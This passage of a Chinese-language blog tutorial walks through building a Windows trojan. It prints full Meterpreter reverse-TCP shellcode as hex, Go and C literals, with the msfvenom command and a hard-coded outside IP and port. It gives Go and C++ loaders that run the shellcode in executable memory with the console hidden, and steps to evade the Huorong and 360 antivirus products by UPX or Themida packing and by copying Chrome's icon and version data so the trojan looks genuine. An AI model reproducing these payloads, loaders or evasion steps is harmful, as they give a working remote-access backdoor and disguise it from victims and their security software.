85c0 75d7 5858 5848 0500</span><br><span class="line">0000 0050 c3e8 9ffd ffff 3132 342e 3232</span><br><span class="line">332e 3231 372e 3234 3300 0000 0000 </span><br><span class="line"></span><br><span class="line">#c语言，在每个16进制前面加了\x，还原的话去掉\x，然后逐个转换为十进制即可~~~</span><br><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112203603.png" alt="image-20220911220316439" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112206243.png" alt="image-20220911220630058" style="zoom:67%;" /></p><h3 id="修改winlaunch-go"><a href="#修改winlaunch-go" class="headerlink" title="修改winlaunch.go"></a>修改winlaunch.go</h3><blockquote><p>winlaunch.go和linuxlaunch.go文件就是加载shellcode的文件</p></blockquote><p>把生成的 shellcode 内容填入sc</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sc := []<span class="type">byte</span>(<span class="string">&quot;shellcode填到这里&quot;</span>)</span><br><span class="line">    winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;shellcode-launch/winshellcode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sc := []<span class="type">byte</span>(<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译生成exe"><a href="#编译生成exe" class="headerlink" title="编译生成exe"></a>编译生成exe</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> CGO_ENABLED=<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> GOOS=windows</span><br><span class="line"><span class="built_in">set</span> GOARCH=amd64</span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> shellcode<span class="literal">-launch-attack</span>.exe winlaunch.go</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#减少文件体积</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> <span class="number">1</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#减少文件体积+隐藏窗口</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> <span class="literal">-o</span> <span class="number">2</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#可选参数 -ldflags  是编译选项：</span></span><br><span class="line"><span class="comment"># -s -w  去掉调试信息，可以减小构建后文件体积，</span></span><br><span class="line"><span class="comment"># -H=windowsgui  隐藏文件执行窗口</span></span><br></pre></td></tr></table></figure><h3 id="过火绒"><a href="#过火绒" class="headerlink" title="过火绒"></a>过火绒</h3><p>随意加壳（亲测可用）：</p><blockquote><ul><li><p>upx壳，静态查杀可直接绕过,shellcode-launch目录下面带了upx.exe</p><blockquote><ul><li><a href="https://github.com/upx/upx/releases/">https://github.com/upx/upx/releases/</a></li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\upx64.exe .\shellcode<span class="literal">-launch-attack</span>.exe</span><br></pre></td></tr></table></figure></blockquote></li><li><p>Themida ,图形化加壳程序，拖进去即可，然后protect开始加壳</p><blockquote><ul><li><a href="https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar">https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar</a></li><li><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654</a></li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209150858295.png" alt="image-20220915085838916" style="zoom:30%;" /></li></ul></blockquote><h3 id="过360"><a href="#过360" class="headerlink" title="过360"></a>过360</h3><p>修改资源&#x2F;修改图标：</p><blockquote><ul><li>restorator 下载地址：<a href="https://www.jb51.net/softs/619405.html">https://www.jb51.net/softs/619405.html</a></li><li><a href="https://www.52pojie.cn/thread-501557-1-1.html">聊聊Restorator的天坑 - 『脱壳破解区』 - 吾爱破解 </a></li></ul><p>restorator 用于修改可执行程序的图标界面版本等信息，直接拖进来即可操作.</p><p>这个软件还是小心使用~~</p><p>可能出现的问题：</p><blockquote><ul><li>若是无法创建 可能是源文件的问题~重新生成木马试试</li><li>加壳后可能无法创建成功</li></ul></blockquote></blockquote><p>使用 restorator  给 木马exe  执行程序添加图标、界面、版本等资源信息，然后保存。即可过360。</p><p>将木马程序和伪造的目标程序拖进来，将目标程序的资源都复制给木马程序~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171531979.png" alt="image-20220917153107754" style="zoom:50%;" /><p>再把chrome都移除删掉，然后保存伪造的shellcode.exe~~很逼真</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171614609.png" alt="image-20220917161407391" style="zoom:50%;" /><p>在任务管理器中：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171631847.png" alt="image-20220917163103657"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171632222.png" alt="image-20220917163220053"></p><p>另外 msinfo32查看进程，查看其是否成功的替换信息，有了版本信息等</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171633380.png" alt="image-20220917163350160"></p><h1 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h1><p>为了使我们的 shellcode 加载到内存并执行，我们需要 shellcode 加载器，也就是我们的 shellcode loader ，不同语言 loader 的写法不同。<br>shellcode 这个东西我们明白是一串可执行的二进制，那么我们先通过其他的手段开辟一片拥有可读可写可执行权限的区域放入我们的 shellcode，然后跳转到 shellcode 首地址去执行就行了</p><blockquote><p>这里怎么理解呢？开辟一片拥有可读可写可执行权限的区域就类似我们定义变量<code>int a；</code>为a申请的一片变量空间，此处不同的地方在于这片区域是具有可执行权限的！</p><p>另外怎么开辟呢？我们利用高级语言调用api执行这个操作</p></blockquote><h1 id="shellcodeLoader-c-x2F-c"><a href="#shellcodeLoader-c-x2F-c" class="headerlink" title="shellcodeLoader-c&#x2F;c++"></a>shellcodeLoader-c&#x2F;c++</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote><p>这串代码的shellcode还是很明显，已经无法免杀，这只是一个简单的shellcode代码。此时我们就只能通过对shellcode进行加密混淆，逃避杀软检测~~下节讲</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  </span></span><br><span class="line"><span class="comment">//隐藏控制台窗口（一）</span></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x1a\x0a\x8b\x9b\x31\x2b\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  void* Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br><span class="line">    Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//  ShowWindow(GetConsoleWindow(), SW_HIDE);  //隐藏控制台窗口（二）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();<span class="comment">//跳到shellcode内存起始位置，开始执行shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h2><h3 id="include语法解释"><a href="#include语法解释" class="headerlink" title="include语法解释"></a>include语法解释</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>#include  叫做文件包含命令，用来引入对应的头文件（ .h 文件）。<br>#include  也是C语言预处理命令的一种。<br>#include  的处理过程很简单，就是将头文件的内容插入到该命令所在的位置，从而把头文件和当前源文件连接成一个源文件，这与复制粘贴的效果相同。<br>#include  的用法有两种，如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdHeader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myHeader.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>使用尖括号 &lt; &gt; 和双引号 “ “ 的区别在于头文件的搜索路径不同：</p><ul><li>使用尖括号 &lt; &gt; ，编译器会到系统路径下查找头文件；</li><li>而使用双引号 “ “ ，编译器首先在当前目录下查找头文件，如果没有找到，再到系统路径下查找</li></ul><p>也就是说，使用双引号比使用尖括号多了一个查找路径，它的功能更为强大。<br>前面我们一直使用尖括号来引入标准头文件，现在我们也可以使用双引号了，如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>stdio.h  和 stdlib.h  都是标准头文件，它们存放于系统路径下，所以使用尖括号和双引号都能够成功引入；<br>而我们自己编写的头文件，一般存放于当前项目的路径下，所以不能使用尖括号，只能使用双引号。</p><h3 id="隐藏控制台"><a href="#隐藏控制台" class="headerlink" title="隐藏控制台"></a>隐藏控制台</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  <span class="comment">//设置连接器选项</span></span></span><br></pre></td></tr></table></figure><ol><li>控制台应用程序一般都会显示一个控制台窗口（虚拟DOS窗口，就是那种cmd黑窗），但很多时候控制台程序的执行逻辑根本不需要与用户进行交互，所以显示这个难看的窗口纯属多余，那么如何将它屏蔽掉呢？</li></ol><p>操作系统装载应用程序后，做完初始化工作就转到程序的入口点执行。程序的默认<strong>入口点</strong>实际上是由<strong>连接程序</strong>设置的，不同的连接器选择的<strong>入口函数</strong>也不尽相同。</p><p>注意这里涉及到两个词语：入口点和入口函数。&#x2F;subsystem定义入口点，&#x2F;entry定义入口函数</p><ol start="2"><li>具体设置哪个入口点是由连接器的 <code>&quot;/subsystem:&quot;</code>  选项参数确定的，它告诉操作系统如何运行编译生成的 .EXE  文件。</li></ol><p>可以指定四种方式： CONSOLE | WINDOWS | NATIVE | POSIX  如果这个选项参数的值为 WINDOWS ，则表示该应用程序运行时不需要控制台。</p><blockquote><p>有关连接器参数选项的详细说明请参考微软文档： <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/subsystem-specify-subsystem?view=msvc-170">&#x2F;SUBSYSTEM（指定子系统） | Microsoft Docs</a></p></blockquote><ol start="3"><li>具体的入口函数设置：</li></ol><blockquote><ul><li>在VC下，连接器对控制台程序设置的入口函数是 mainCRTStartup ， mainCRTStartup  再调用你自己编写的 main  函数；</li><li>在图形用户界面（GUI）程序下，设置的入口函数是 WinMainCRTStartup ， WinMainCRTStartup  调用你自己写的 WinMain  函数。</li></ul></blockquote><ol start="4"><li><code>#pragma comment</code>的解释</li></ol><p>#pragma 